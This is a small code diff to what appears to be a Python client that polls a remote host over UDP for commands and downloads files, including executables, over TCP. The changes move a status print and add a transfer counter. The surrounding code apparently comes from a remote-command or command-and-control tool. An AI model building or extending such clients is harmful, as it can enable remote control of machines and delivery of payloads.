@@ -16,7 +16,6 @@ tcp_buffer_size = 4096
 
 
 def get_command(request, sock, host, port):
-    print("[-] Requesting command...")
 
     while True:
         try:
@@ -72,6 +71,7 @@ s = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
 try:
 
     while True:
+        print("[-] Requesting command...")
         command = get_command(Commands.REQUEST, s, REMOTE_HOST, REMOTE_PORT)
 
         if command == 'file':
@@ -87,11 +87,14 @@ try:
                 current_input = tcp_connection.recv(tcp_buffer_size)
                 current_input = current_input.decode() if not is_exe else current_input
 
+                counter = 0
                 while commands.str_to_command(current_input) != Commands.END_TRANSFER:
+                    counter += 1
                     f.write(current_input)
                     tcp_connection.send(commands.to_byte(Commands.FILE))
                     current_input = tcp_connection.recv(tcp_buffer_size)
                     current_input = current_input.decode() if not is_exe else current_input
+                print(counter)
 
             finally:
                 tcp_connection.close()
